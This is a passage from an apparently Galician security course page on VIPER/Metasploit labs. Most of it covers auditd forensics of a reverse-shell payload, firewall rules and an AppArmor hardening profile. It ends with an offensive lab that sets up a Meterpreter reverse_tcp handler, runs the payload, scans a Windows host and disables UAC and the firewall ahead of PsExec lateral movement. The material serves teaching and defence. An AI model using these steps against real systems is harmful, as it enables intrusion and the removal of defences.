a2=0x55ff71934b40 a3=0xd016c19e5dca8816 items=2 ppid=1942 pid=6055 auid=losada uid=losada gid=losada euid=losada suid=losada fsuid=losada egid=losada sgid=losada fsgid=losada tty=pts0 ses=2 comm=1743838036.elf exe=/home/losada/1743838036.elf subj=unconfined key=process_creation\n</code></pre> <p>Aqu\u00ed, o PID \u00e9 <code>6055</code>.</p> <p>Paso 2: Buscar conexi\u00f3ns de rede feitas por ese PID:  Agora usa a chave <code>network_connection</code> e filtra polo PID que atopaches no paso anterior. Tam\u00e9n podes usar un rango de tempo (<code>-ts</code>, <code>-te</code>) se co\u00f1eces cando ocorreu a execuci\u00f3n. <pre><code># Substit\u00fae &lt;PID&gt; polo PID atopado (ex: 5678)\nausearch -k network_connection -p &lt;PID&gt; -i\nausearch -k network_connection -p 6055 -i\n----\ntype=PROCTITLE msg=audit(05/04/25 22:28:49.552:227) : proctitle=./1743838036.elf\ntype=SOCKADDR msg=audit(05/04/25 22:28:49.552:227) : saddr={ saddr_fam=inet laddr=192.168.120.100 lport=4444 }\ntype=SYSCALL msg=audit(05/04/25 22:28:49.552:227) : arch=x86_64 syscall=connect success=no exit=EINPROGRESS(Operaci\u00f3n en curso) a0=0x5 a1=0x555570f135b0 a2=0x10 a3=0x0 items=0 ppid=1942 pid=6055 auid=losada uid=losada gid=losada euid=losada suid=losada fsuid=losada egid=losada sgid=losada fsgid=losada tty=pts0 ses=2 comm=1743838036.elf exe=/home/losada/1743838036.elf subj=unconfined key=network_connection\n</code></pre></p> <p>Ou, se queres buscar directamente conexi\u00f3ns feitas por ese nome de executable (pode ser m\u00e1is directo): <pre><code>ausearch -k network_connection -i | grep 'exe=\"/ruta/completa/a/payload_descargado.elf\"'\n</code></pre> (De novo, axusta a ruta ou usa s\u00f3 o nome do execut\u00e1bel)</p> <p>A sa\u00edda buscar\u00e1 eventos <code>type=SYSCALL</code> coa chamada <code>connect</code> (syscall=42 en x86_64) e mostrar\u00e1 o PID e o nome do execut\u00e1bel (<code>exe=</code>). Se <code>payload_descargado.elf</code> fixo conexi\u00f3ns de rede sa\u00edntes mentres <code>auditd</code> estaba activo coas regras cargadas, deber\u00edas velo aqu\u00ed. A sa\u00edda incluir\u00e1 detalles sobre o socket (familia, enderezo IP/porto de destino se est\u00e1 dispo\u00f1ible no momento da auditor\u00eda).</p> <p>Exemplo de Sa\u00edda de Conexi\u00f3n: <pre><code>type=SYSCALL msg=audit(1678886405.456:480): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ff... a2=10 a3=0 items=0 ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=\"payload_descarga\" exe=\"/home/usuario/payload_descargado.elf\" subj=... key=\"network_connection\"\ntype=SOCKADDR msg=audit(1678886405.456:480): saddr=0200115C C0A80135 0000000000000000 // Familia AF_INET (2), Porto 4444 (0x115C), IP 192.168.120.100 (C0A80135)\n</code></pre> (Neste exemplo, o proceso 5678, executando <code>payload_descargado.elf</code>, conectouse (syscall 42) a 192.168.120.100 no porto 4444).</p> <p>O comando ausearch non amosa nada</p> <p>\u00c9 unha situaci\u00f3n com\u00fan cando se traballa con logs de auditor\u00eda. Hai varias raz\u00f3ns polas que o comando <code>ausearch -k network_connection -i | grep 'exe=\"/home/losada/1743838036.elf\"'</code> poder\u00eda non mostrar nada, a\u00ednda que saibas que o proceso est\u00e1 facendo conexi\u00f3ns:</p> <ol> <li> <p>O Proceso Principal Non Fai a Conexi\u00f3n Directamente: Moitas veces, un payload (como o teu ELF) que proporciona un shell remoto non realiza todas as operaci\u00f3ns de rede directamente. Cando executas <code>ping 8.8.8.8</code> dentro dese shell remoto:</p> <ul> <li>O proceso <code>1743838036.elf</code> (o teu shell/payload) crea un novo proceso fillo, que \u00e9 o comando <code>/usr/bin/ping</code>.</li> <li>\u00c9 este novo proceso <code>/usr/bin/ping</code> o que realmente fai as chamadas ao sistema <code>connect</code> (ou <code>sendto</code>/<code>recvfrom</code> para ICMP) para enviar e recibir os paquetes do ping.</li> <li>Polo tanto, o evento de auditor\u00eda para a conexi\u00f3n de rede ter\u00e1 <code>exe=\"/usr/bin/ping\"</code>, non <code>exe=\"/home/user/1743838036.elf\"</code>. A conexi\u00f3n do propio shell reverso ao servidor C2 (VIPER) si deber\u00eda estar asociada ao ELF inicial, pero vexamos iso despois.</li> </ul> </li> <li> <p>O Campo <code>exe</code> Non Coincide Exactamente: \u00c1s veces, a forma en que se rexistra o nome do execut\u00e1bel pode variar lixeiramente (p.ex., por resoluci\u00f3n de enlaces simb\u00f3licos, ou se o proceso cambia o seu nome). O <code>grep</code> que est\u00e1s usando \u00e9 moi espec\u00edfico.</p> </li> <li> <p>As Regras Non Estaban Activas Cando Se Fixo a Conexi\u00f3n Inicial: Se o payload se executou antes de que as regras de auditor\u00eda para <code>connect</code> estivesen correctamente cargadas e activas (<code>augenrules --load</code>), a conexi\u00f3n inicial ao C2 poder\u00eda non terse rexistrado.</p> </li> <li> <p>Buffer de Auditor\u00eda ou Atraso: Pode haber un lixeiro atraso entre o evento e a s\u00faa aparici\u00f3n nos logs consultables.</p> </li> </ol> <p>Como Solucionalo e Investigar con <code>ausearch</code>:</p> <p>Paso 1: Verifica que as regras est\u00e1n activas</p> <pre><code>auditctl -l | grep network_connection\n</code></pre> <p>Deber\u00edas ver as regras que definiches para a chamada ao sistema <code>connect</code> coa chave <code>network_connection</code>. Se non aparecen, rec\u00e1rgaas: <code>augenrules --load</code>.</p> <p>Paso 2: Busca Conexi\u00f3ns de Rede de Forma M\u00e1is Ampla (e Recente)</p> <p>Elimina o <code>grep</code> para ver todos os eventos de conexi\u00f3n recentes e busca manualmente ou cun <code>grep</code> menos espec\u00edfico:</p> <pre><code>ausearch -k network_connection -i -ts recent\n</code></pre> <ul> <li><code>-ts recent</code>: Busca eventos moi recentes (\u00faltimos 10 minutos por defecto). Podes usar <code>-ts today</code>, <code>-ts yesterday</code> ou especificar tempos exactos con <code>-ts hh:mm:ss</code>.</li> <li>Revisa a sa\u00edda. Busca calquera li\u00f1a <code>type=SYSCALL</code> que te\u00f1a <code>syscall=42</code> (connect en x86_64). Mira os campos <code>pid</code>, <code>ppid</code>, <code>comm=</code> (nome do comando), e <code>exe=</code> para cada evento.</li> </ul> <p>Paso 3: Busca o PID do Payload e Fai a Busca por PID</p> <ol> <li> <p>Atopa o PID do teu payload mentres se est\u00e1 executando:     <pre><code>ps aux | grep 1743838036.elf\n</code></pre>     Ou busca o evento de creaci\u00f3n do proceso:     <pre><code>ausearch -k process_creation -x /home/losada/1743838036.elf -i -ts recent\n</code></pre>     An\u00f3ta o <code>pid=</code> que aparece no evento <code>execve</code>. Supo\u00f1amos que \u00e9 <code>7123</code>.</p> </li> <li> <p>Busca conexi\u00f3ns de rede feitas especificamente por ese PID:     <pre><code>ausearch -k network_connection -p 7123 -i -ts recent\n</code></pre>     Isto deber\u00eda mostrar a conexi\u00f3n inicial que o teu payload fixo ao servidor C2 de VIPER (asumindo que as regras estaban activas nese momento). Examina o evento <code>SOCKADDR</code> asociado para ver a IP e porto de destino.</p> </li> </ol> <p>Paso 4: Busca o PID do Proceso <code>ping</code> e as S\u00faas Conexi\u00f3ns</p> <ol> <li> <p>Mentres o <code>ping 8.8.8.8</code> se est\u00e1 executando desde o shell de VIPER, busca o seu PID na m\u00e1quina v\u00edtima:     <pre><code>ps aux | grep \"ping 8.8.8.8\"\n</code></pre>     An\u00f3ta o PID. Supo\u00f1amos que \u00e9 <code>7150</code>.</p> </li> <li> <p>Busca conexi\u00f3ns de rede (ou actividade relacionada) feitas por ese PID <code>ping</code>:     <pre><code># Busca xeral por PID\nausearch -p 7150 -i -ts recent\n\n# Busca espec\u00edfica de conexi\u00f3ns (pode que ping use outras syscalls ademais de connect para ICMP)\nausearch -k network_connection -p 7150 -i -ts recent\n</code></pre>     Se atopas eventos para o PID <code>7150</code>, mira o campo <code>exe=</code>. Case seguro que ser\u00e1 <code>/usr/bin/ping</code> (ou similar). Tam\u00e9n podes ver o <code>ppid=</code> (Parent PID) neste evento, que deber\u00eda coincidir co PID do teu payload (<code>7123</code> no noso exemplo). Isto confirma a relaci\u00f3n pai-fillo.</p> </li> </ol> <p>Paso 5: Usa un Grep M\u00e1is Tolerante</p> <p>Se queres seguir usando <code>grep</code> pero sendo menos espec\u00edfico co campo <code>exe</code>:</p> <pre><code>ausearch -k network_connection -i -ts recent | grep 1743838036.elf\n</code></pre> <p>Isto atopar\u00e1 o nome do ficheiro en calquera parte da li\u00f1a do log, non s\u00f3 no campo <code>exe=</code>.</p> <p>En Resumo:</p> <p>A forma m\u00e1is fiable \u00e9 probablemente buscar primeiro a creaci\u00f3n do proceso do teu payload (<code>-k process_creation</code>) para obter o seu PID, e logo usar ese PID para buscar as s\u00faas conexi\u00f3ns de rede (<code>-k network_connection -p &lt;PID&gt;</code>). Para comandos executados dentro do shell (como <code>ping</code>), busca o PID dese comando espec\u00edfico e investiga os seus propios eventos de rede, fix\u00e1ndote no <code>ppid</code> para relacionalo co payload orixinal.</p> <p>5. Consideraci\u00f3ns Adicionais</p> <ul> <li>Volume de Logs: As regras proporcionadas poden xerar moitos logs, especialmente <code>execve</code> en sistemas ocupados. En ambientes de produci\u00f3n, poder\u00edas querer afinar as regras (por exemplo, auditar s\u00f3 certos directorios, exclu\u00edr usuarios/procesos de confianza, ou auditar s\u00f3 execuci\u00f3ns fallidas).</li> <li>Log Rotation: Aseg\u00farate de que a rotaci\u00f3n de logs para <code>auditd</code> est\u00e1 configurada (normalmente en <code>/etc/logrotate.d/auditd</code>) para evitar que o disco se encha.</li> <li>Interpretaci\u00f3n: A sa\u00edda de <code>auditd</code> \u00e9 detallada. <code>ausearch -i</code> axuda moito na interpretaci\u00f3n. Para an\u00e1lises m\u00e1is complexas, ferramentas como <code>aureport</code> ou a exportaci\u00f3n a un SIEM son \u00fatiles.</li> <li>Impacto no Rendemento: A auditor\u00eda intensiva pode ter un lixeiro impacto no rendemento do sistema. Monitoriza o teu sistema despois de aplicar regras extensivas.</li> </ul> <p>Usando <code>auditd</code> desta maneira, podes obter un rexistro detallado da actividade dos procesos e as s\u00faas conexi\u00f3ns de rede, o que \u00e9 invaluable para a an\u00e1lise forense e a detecci\u00f3n de intrusi\u00f3ns como a execuci\u00f3n dun payload malicioso.</p>"},{"location":"ud4/viper/#bastionado-e-mitigacion","title":"Bastionado e Mitigaci\u00f3n","text":"<p>1. Implementar un firewall robusto:</p> <p>a. ufw <pre><code>apt -y install ufw\nufw enable\nufw allow ssh\nufw deny 4444  # Porto do ataque\nufw status\nufw disable\n</code></pre></p> <p>b. iptables</p> <ul> <li>1. Bloquear conexi\u00f3ns Reverse TCP Para bloquear conexi\u00f3ns de reverse TCP espec\u00edficas, debes identificar o porto de sa\u00edda utilizado. Normalmente, ferramentas como Metasploit usan portos como <code>4444</code>, pero VIPER pode configurarse con calquera porto.</li> </ul> <pre><code>iptables -A OUTPUT -p tcp --dport 4444 -j DROP\n</code></pre> <p>Se queres bloquear todas as conexi\u00f3ns de sa\u00edda a un servidor espec\u00edfico (por exemplo, o C2 de VIPER): <pre><code>iptables -A OUTPUT -d &lt;IP_SERVIDOR_C2&gt; -j DROP\n</code></pre></p> <ul> <li>2. Crear logs para detectar Reverse TCP Crear logs detallados con <code>iptables</code> para detectar calquera conexi\u00f3n sospeitosa. <pre><code>iptables -A OUTPUT -p tcp --dport 4444 -j LOG --log-prefix \"Reverse TCP Detection: \"\n</code></pre> Os logs poden ser visualizados con: <pre><code># dmesg | grep 'UFW BLOCK'\n[ 5317.987456] [UFW BLOCK] IN=enp0s8 OUT= MAC=08:00:27:ec:52:e4:08:00:27:0c:d4:a9:08:00 SRC=192.168.120.100 DST=192.168.120.101 LEN=180 TOS=0x00 PREC=0x00 TTL=64 ID=58544 DF PROTO=TCP SPT=4444 DPT=44780 WINDOW=501 RES=0x00 ACK PSH URGP=0\n[ 5318.195056] [UFW BLOCK] IN=enp0s8 OUT= MAC=08:00:27:ec:52:e4:08:00:27:0c:d4:a9:08:00 SRC=192.168.120.100 DST=192.168.120.101 LEN=180 TOS=0x00 PREC=0x00 TTL=64 ID=58545 DF PROTO=TCP SPT=4444 DPT=44780 WINDOW=501 RES=0x00 ACK PSH URGP=0\n# dmesg | grep \"Reverse TCP Detection\"\n[ 6031.908612] Reverse TCP Detection: IN= OUT=enp0s8 SRC=192.168.120.101 DST=192.168.120.100 LEN=196 TOS=0x00 PREC=0x00 TTL=64 ID=27356 DF PROTO=TCP SPT=59436 DPT=4444 WINDOW=501 RES=0x00 ACK PSH URGP=0\n[ 6069.974689] Reverse TCP Detection: IN= OUT=enp0s8 SRC=192.168.120.101 DST=192.168.120.100 LEN=212 TOS=0x00 PREC=0x00 TTL=64 ID=27357 DF PROTO=TCP SPT=59436 DPT=4444 WINDOW=501 RES=0x00 ACK PSH URGP=0\n</code></pre></li> </ul> <p>Ou se est\u00e1s usando <code>journalctl</code>: <pre><code>journalctl -k | grep \"Reverse TCP Detection\"\nabr 04 02:22:00 nodo01 kernel: Reverse TCP Detection: IN= OUT=enp0s8 SRC=192.168.120.101 DST=192.168.120.100 LEN=196 TOS=0x00 PREC=0x00 TTL=64 ID=27356 DF PROTO=TCP SPT=59436 DPT=4444 WINDOW=501 RES=0x00 ACK PSH URGP=0\nabr 04 02:22:38 nodo01 kernel: Reverse TCP Detection: IN= OUT=enp0s8 SRC=192.168.120.101 DST=192.168.120.100 LEN=212 TOS=0x00 PREC=0x00 TTL=64 ID=27357 DF PROTO=TCP SPT=59436 DPT=4444 WINDOW=501 RES=0x00 ACK PSH URGP=0\n</code></pre></p> <p>Ou se est\u00e1s usando <code>rsyslog</code></p> <pre><code>cat /var/log/syslog | grep \"Reverse TCP Detection\"\n</code></pre> <ul> <li>3. Persistencia das regras de iptables Para que as regras de <code>iptables</code> persistan tras un reinicio: <pre><code>iptables-save &gt; /etc/iptables/rules.v4\n</code></pre> Para restaurar: <pre><code>iptables-restore &lt; /etc/iptables/rules.v4\n</code></pre></li> </ul> <p>2. Uso de AppArmor para Previr a Execuci\u00f3n de Payloads</p> <p>AppArmor \u00e9 un sistema de Control de Acceso Mandatorio (MAC) para Linux que permite restrinxir as capacidades dos programas. Podemos usalo para denegar a execuci\u00f3n de ficheiros en directorios com\u00fans onde os atacantes adoitan escribir payloads (como <code>/tmp</code>, <code>/var/tmp</code>, ou mesmo directorios de usuario).</p> <p>a. Instalar Utilidades de AppArmor</p> <p>Aseg\u00farate de ter as ferramentas necesarias instaladas:</p> <pre><code>apt update\napt install apparmor-utils apparmor-profiles apparmor-profiles-extra\n</code></pre> <p>b. Crear o Ficheiro de Perfil de AppArmor</p> <p>Crearemos un perfil personalizado en <code>/etc/apparmor.d/</code>. As barras <code>/</code> no nome do perfil substit\u00faense por puntos <code>.</code>.</p> <pre><code>nano /etc/apparmor.d/local.deny-execute-unsafe-paths\n</code></pre> <p>c. Engadir o Contido do Perfil</p> <p>Pega o seguinte c\u00f3digo no ficheiro aberto (<code>local.deny-execute-unsafe-paths</code>):</p> <pre><code># /etc/apparmor.d/local.deny-execute-unsafe-paths\n# Perfil local para denegar a execuci\u00f3n en rutas com\u00fans de descarga/temporais\n\n# Inclu\u00edr definici\u00f3ns globais (importante)\n#include &lt;tunables/global&gt;\n\n# Definir o perfil - D\u00e1lle un nome \u00fanico con namespace 'local'\nprofile local:deny-execute-unsafe-paths flags=(attach_disconnected) {\n\n  # Inclu\u00edr abstracci\u00f3ns b\u00e1sicas (recomendado)\n  #include &lt;abstractions/base&gt;\n\n  # --- Regras Principais de Denegaci\u00f3n ---\n\n  # Denegar execuci\u00f3n (mx) en /tmp e /var/tmp recursivamente\n  # m: memory map executable. Denegar para evitar t\u00e9cnicas de evasi\u00f3n com\u00fans.\n  # x: Permiso de execuci\u00f3n\n  # **: Coincide recursivamente con todos os ficheiros e directorios dentro\n  deny /tmp/** mx,\n  deny /var/tmp/** mx,\n\n# --- Denegar execuci\u00f3n en directorios home ---\n# !!! danger \"Restrinxir /home \u00e9 Arriscado\"\n#     Descomentar estas li\u00f1as pode romper aplicaci\u00f3ns lex\u00edtimas (instaladores,\n#     scripts de usuario, etc.). PROBA EXTENSIVAMENTE en modo complain.\n#     Considere mellor restrinxir aplicaci\u00f3ns espec\u00edficas (navegador, correo).\n# deny @{HOME}/** mx,\n# deny /home/*/** mx, # Alternativa se @{HOME} non funciona como esperado\n\n# Permitir outras operaci\u00f3ns pode ser necesario se o perfil fose m\u00e1is complexo,\n# pero para un 'deny' expl\u00edcito, non son estrictamente obrigatorias.\n}\n</code></pre> <ul> <li>Explicaci\u00f3n:<ul> <li><code>deny ... mx,</code>: Bloquea tanto a execuci\u00f3n directa como a carga indirecta de c\u00f3digo execut\u00e1ble para todos os ficheiros (<code>**</code>) dentro dos directorios especificados (<code>/tmp/</code>, <code>/var/tmp/</code>).</li> <li>A secci\u00f3n para <code>@{HOME}</code> est\u00e1 comentada por precauci\u00f3n.</li> </ul> </li> </ul> <p>d. Gardar e Pechar</p> <p>En <code>nano</code>, preme <code>Ctrl+O</code>, <code>Enter</code>, e logo <code>Ctrl+X</code>.</p> <p>e. Cargar o Perfil en Modo Complain</p> <p>Probar Primeiro en Modo Complain</p> <p>\u00c9 crucial cargar primeiro o perfil en modo complain (queixarse). Neste modo, AppArmor rexistra as violaci\u00f3ns das regras pero non as bloquea. Isto perm\u00edteche ver se o perfil interfire con operaci\u00f3ns lex\u00edtimas do sistema antes de aplicalo de forma estrita.</p> <p><pre><code># Cargar/Recargar o perfil no kernel e escribir na cach\u00e9\napparmor_parser -r -W /etc/apparmor.d/local.deny-execute-unsafe-paths\n\n# Po\u00f1er o perfil espec\u00edfico en modo complain\naa-complain local.deny-execute-unsafe-paths\n</code></pre> Aseg\u00farate de que <code>local.deny-execute-unsafe-paths</code> coincide co nome usado dentro do ficheiro de perfil.</p> <p>f. Realizar Probas</p> <ol> <li>Crea un script simple ou copia un executable pequeno a <code>/tmp</code>.     <pre><code>echo -e '#!/bin/bash\\necho \"Ola desde /tmp!\"' &gt; /tmp/test_script.sh\n</code></pre></li> <li>D\u00e1lle permisos de execuci\u00f3n:     <pre><code>chmod +x /tmp/test_script.sh\n</code></pre></li> <li>Intenta executalo:     <pre><code>/tmp/test_script.sh\n</code></pre></li> <li> <p>Revisa os Logs de AppArmor: Mentres o perfil est\u00e1 en modo complain, a execuci\u00f3n deber\u00eda funcionar, pero deber\u00edas ver mensaxes de violaci\u00f3n nos logs do sistema indicando que AppArmor ter\u00eda bloqueado a acci\u00f3n.     <pre><code># Busca mensaxes de AppArmor nos logs do sistema\njournalctl -f | grep -E 'apparmor=\"DENIED\"|apparmor=\"ALLOWED\" operation=\"exec\"'\n# Tam\u00e9n podes revisar /var/log/audit/audit.log ou /var/log/syslog\n</code></pre>     Busca entradas relacionadas co perfil <code>local.deny-execute-unsafe-paths</code> e a operaci\u00f3n de execuci\u00f3n (<code>operation=\"exec\"</code>, <code>permission=\"execute\"</code>) sobre o teu script en <code>/tmp</code>.</p> <p>journalctl non amosa nada pero audit.log si, por que?</p> <p>\u00c9 unha situaci\u00f3n moi habitual e a raz\u00f3n principal adoita ser a forma en que <code>auditd</code> e <code>journald</code> interact\u00faan co subsistema de auditor\u00eda do kernel:</p> <ol> <li> <p>AppArmor Xera Eventos de Auditor\u00eda do Kernel: Cando AppArmor toma unha decisi\u00f3n (PERMITIR/DENEGAR), non escribe directamente nun ficheiro de log. En cambio, xera un evento a trav\u00e9s do subsistema de auditor\u00eda do kernel de Linux (o mesmo que usa <code>auditd</code> para monitorizar chamadas ao sistema).</p> </li> <li> <p><code>auditd</code> \u00e9 o Consumidor Principal (se est\u00e1 activo): O daemon <code>auditd</code> est\u00e1 dese\u00f1ado especificamente para escoitar e rexistrar estes eventos de auditor\u00eda do kernel. Cando <code>auditd</code> est\u00e1 instalado, activo e configurado correctamente (o cal \u00e9 o caso por defecto cando o instalas), conv\u00e9rtese no receptor principal e moitas veces exclusivo destes eventos. Leos directamente do kernel e escr\u00edbeos no seu propio ficheiro de log: <code>/var/log/audit/audit.log</code>.</p> </li> <li> <p><code>journald</code> e os Eventos de Auditor\u00eda: O daemon <code>journald</code> (o backend de <code>journalctl</code>) tam\u00e9n recolle mensaxes do kernel (a trav\u00e9s de <code>printk</code>/<code>/dev/kmsg</code>). En teor\u00eda, poder\u00eda ver os eventos de auditor\u00eda que AppArmor xera. Por\u00e9n:</p> <ul> <li>Preferencia de <code>auditd</code>: O sistema est\u00e1 dese\u00f1ado para que, se <code>auditd</code> est\u00e1 activo, el te\u00f1a prioridade para procesar os eventos de auditor\u00eda. Nalg\u00fans casos, o kernel pode enviar os eventos s\u00f3 a <code>auditd</code> cando est\u00e1 configurado como o sistema de auditor\u00eda activo, e non os duplica ao fluxo normal de mensaxes do kernel (<code>printk</code>) do que le <code>journald</code>.</li> <li>Configuraci\u00f3n de <code>auditd</code>: A configuraci\u00f3n de <code>auditd</code> (<code>/etc/audit/auditd.conf</code>) e as regras cargadas (<code>auditctl</code>) poden influ\u00edr en como se manexan os eventos. Se <code>auditd</code> est\u00e1 en modo \"inmutable\" (<code>auditctl -e 2</code>) ou simplemente activo (<code>auditctl -e 1</code>), o kernel entende que <code>auditd</code> \u00e9 o destino principal.</li> <li>Posible Filtrado en <code>journald</code> (Menos probable): A\u00ednda que <code>journald</code> vise os eventos, poder\u00eda haber regras de filtrado ou rate-limiting (a\u00ednda que \u00e9 menos com\u00fan para eventos de seguridade como os de AppArmor).</li> </ul> </li> <li> <p>O Comando <code>grep</code>: O teu comando <code>grep</code> para <code>journalctl</code> (<code>grep -E 'apparmor=\"DENIED\"|apparmor=\"ALLOWED\" operation=\"exec\"'</code>) busca cadeas espec\u00edficas que aparecen dentro do rexistro de auditor\u00eda. Se <code>journald</code> non est\u00e1 recibindo eses rexistros en primeiro lugar, o <code>grep</code> non atopar\u00e1 nada. O formato en <code>/var/log/audit/audit.log</code> \u00e9 o formato nativo de auditor\u00eda, que cont\u00e9n esas cadeas exactas.</p> </li> </ol> <p>En Resumo:</p> <p>A raz\u00f3n m\u00e1is probable pola que ves os logs de AppArmor en <code>/var/log/audit/audit.log</code> pero non con <code>journalctl</code> \u00e9 porque <code>auditd</code> est\u00e1 activo e est\u00e1 interceptando/consumindo os eventos de auditor\u00eda do kernel directamente, antes ou en lugar de que cheguen ao fluxo de mensaxes do kernel que <code>journald</code> monitoriza.</p> <p>Que facer?</p> <ul> <li>Conf\u00eda en <code>auditd</code> para os logs de AppArmor: Cando <code>auditd</code> est\u00e1 activo, a forma est\u00e1ndar e m\u00e1is fiable de ver os eventos de AppArmor (e outros eventos de auditor\u00eda) \u00e9 usar as ferramentas de <code>auditd</code>:<ul> <li><code>ausearch -m avc -ts recent</code> (Busca eventos espec\u00edficos de AppArmor/SELinux recentes)</li> <li><code>ausearch -m apparmor -ts recent</code> (Se o teu sistema etiqueta especificamente AppArmor)</li> <li><code>tail -f /var/log/audit/audit.log | grep -i apparmor</code> (Monitoriza o ficheiro directamente)</li> </ul> </li> <li>Verifica o estado de <code>auditd</code>: <pre><code>systemctl status auditd\nauditctl -s # Mira se 'enabled' \u00e9 1 ou 2\n</code></pre></li> <li>Se realmente queres os logs en <code>journald</code>: Poder\u00edas deter ou desactivar <code>auditd</code> (<code>systemctl stop auditd &amp;&amp; systemctl disable auditd</code>). Nese caso, os eventos de auditor\u00eda do kernel deber\u00edan empezar a aparecer en <code>journalctl</code> (xa que non haber\u00eda un consumidor principal intercept\u00e1ndoos). Non obstante, isto desactiva todo o sistema de auditor\u00eda de <code>auditd</code>, o cal non adoita ser recomendable por raz\u00f3ns de seguridade. Unha alternativa ser\u00eda configurar <code>audispd-plugins</code> (como <code>audisp-remote</code> ou outros) para reenviar eventos desde <code>auditd</code> a outros sistemas, ou configurar <code>rsyslog</code> para ler o ficheiro <code>audit.log</code>, pero iso complica a configuraci\u00f3n.</li> </ul> </li> </ol> <p>g. Activar o Modo Enforce</p> <p>Se as probas en modo complain foron satisfactorias e non detectaches o bloqueo de procesos lex\u00edtimos, podes activar o modo enforce (forzar):</p> <pre><code>aa-enforce local.deny-execute-unsafe-paths\n</code></pre> <p>Agora, calquera intento de executar un ficheiro directamente desde <code>/tmp</code> ou <code>/var/tmp</code> deber\u00eda fallar cun erro de \"Permission denied\".</p> <p>Limitaci\u00f3ns e Consideraci\u00f3ns</p> <ul> <li>Int\u00e9rpretes vs. Binarios: Este perfil bloquea a execuci\u00f3n directa (<code>./meu_script</code>), pero non necesariamente a execuci\u00f3n a trav\u00e9s dun int\u00e9rprete permitido (<code>bash /tmp/meu_script.sh</code>). Para iso, necesitar\u00edas perf\u00eds m\u00e1is espec\u00edficos para os int\u00e9rpretes.</li> <li>Complexidade con <code>/home</code>: Bloquear a execuci\u00f3n no directorio <code>home</code> \u00e9 complexo e pode romper funcionalidades. \u00c9 xeralmente mellor restrinxir aplicaci\u00f3ns individuais (como navegadores) que poidan descargar e tentar executar payloads.</li> <li>Combinaci\u00f3n de Defensas: AppArmor \u00e9 unha capa de seguridade. Comb\u00ednaa con permisos de ficheiros adecuados, opci\u00f3ns de montaxe de sistemas de ficheiros como <code>noexec</code> onde sexa aplicable, e outras boas pr\u00e1cticas de seguridade.</li> </ul>"},{"location":"ud4/viper/#exemplo-2-movemento-lateral-expandir-acceso","title":"Exemplo 2: Movemento Lateral (Expandir Acceso)","text":"<p>Prerrequisito: Facer Exemplo1</p> <p>Arquitectura do Escenario de Movemento Lateral</p> <p></p> <p>Asumimos que o atacante xa comprometeu <code>VM-2</code> (ver Exemplo 1) e agora quere acceder a outros sistemas (VM-3) na mesma rede interna.</p>"},{"location":"ud4/viper/#escenario-resumido_1","title":"Escenario Resumido","text":"<ul> <li><code>VM-1</code> (VIPER): <code>192.168.120.100</code> (Centro de control, onde est\u00e1 VIPER con <code>msfconsole</code>).</li> <li><code>VM-2</code> (Debian con payload activo): <code>192.168.120.101</code> (Acceso logrado dende <code>VM-1</code> a trav\u00e9s dun <code>Meterpreter</code> activo).</li> <li><code>VM-3</code> (Windows 10 Enterprise Evaluation): <code>192.168.120.102</code> (Portos abertos: <code>135</code>, <code>139</code>, <code>445</code>, con credenciais v\u00e1lidas <code>usuario/abc123</code>).</li> </ul>"},{"location":"ud4/viper/#obxectivo-movemento-lateral-dende-vm-2-cara-vm-3","title":"Obxectivo: Movemento lateral dende <code>VM-2</code> cara <code>VM-3</code>.","text":""},{"location":"ud4/viper/#paso-1-acceso-a-vm-2-payload-activo","title":"Paso 1: Acceso \u00e1 <code>VM-2</code> (Payload activo)","text":""},{"location":"ud4/viper/#execucion-dende-vm-1-msfconsole-viper","title":"Execuci\u00f3n dende <code>VM-1</code> (msfconsole - VIPER)","text":"<pre><code>use exploit/multi/handler\nset payload linux/x64/meterpreter/reverse_tcp\nset LHOST 192.168.120.100\nset LPORT 4444\nrun\n</code></pre>"},{"location":"ud4/viper/#execucion-dende-vm-2-bash-linux","title":"Execuci\u00f3n dende <code>VM-2</code> (Bash - Linux)","text":"<pre><code>./1743719330.elf #payload.elf\n</code></pre> <p>Agora deber\u00edas ter acceso \u00e1 <code>VM-2</code> a trav\u00e9s de <code>meterpreter</code>.</p> <p></p>"},{"location":"ud4/viper/#paso-2-movemento-lateral-cara-vm-3","title":"Paso 2: Movemento lateral cara <code>VM-3</code>","text":"<p>Movemento Lateral vs. Pivoting</p> <ul> <li><code>Movemento Lateral</code> \u00e9 a t\u00e9cnica de moverse dun sistema a outro dentro da mesma rede comprometida sen utilizar ning\u00fan tipo de proxy ou t\u00fanel.</li> <li><code>Pivoting</code> implica crear un proxy ou t\u00fanel para acceder a redes que non son directamente accesibles.</li> </ul> <p>Neste escenario, imos asumir que <code>VM-2</code> pode comunicarse directamente con <code>VM-3</code> a trav\u00e9s da rede (<code>192.168.120.0/24</code>). Non se est\u00e1 utilizando <code>Pivoting</code>, s\u00f3 Movemento Lateral.</p>"},{"location":"ud4/viper/#escaneo-de-vm-3-dende-vm-2","title":"Escaneo de <code>VM-3</code> dende <code>VM-2</code>","text":"<p>Lembrar que estamos dentro dunha consola <code>meterpreter</code></p> <p>De a\u00ed que ao rematar a enumeraci\u00f3n executemos o comando <code>exit</code> para voltar \u00e1 consola <code>mfsconsole</code></p> <p>De interese</p> <p>Enumeraci\u00f3n - Practica-SI-ActiveDirectory-Enumeracion.pdf</p> <ol> <li> <p>Comprobar conectividade e Enumerar sistema operativo mediante TTL (64\u2192Linux, 128\u2192Windows) <pre><code>ping -c2 192.168.120.102 #TTL&lt;=128 \u2192 Windows\n</code></pre></p> </li> <li> <p>Enumerar portos TCP open <pre><code>nc -vz 192.168.120.102 135 139 445 #Escaneo portos com\u00fans\nexit\nexit\n</code></pre></p> </li> </ol> <p></p>"},{"location":"ud4/viper/#paso-3-movemento-lateral-con-psexec-smb","title":"Paso 3: Movemento Lateral con <code>Psexec</code> (SMB)","text":"<p>Desactivar UAC e Firewall en Windows (modo laboratorio)</p> <p>Para contornas de proba ou laboratorio, podes desactivar o UAC e o firewall de Windows Server ou Windows 10 cos seguintes comandos. Executa o terminal como administrador.</p> <p>Desactivar UAC (User Account Control):</p> <pre><code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f\nshutdown /r /t 0\n</code></pre> <p>Isto modifica o rexistro para desactivar completamente o UAC. Requ\u00edrese reinicio.</p> <p>Desactivar o firewall en todos os perf\u00eds (dominio, privado, p\u00fablico):</p> <pre><code>netsh advfirewall set allprofiles state off\n</code></pre> 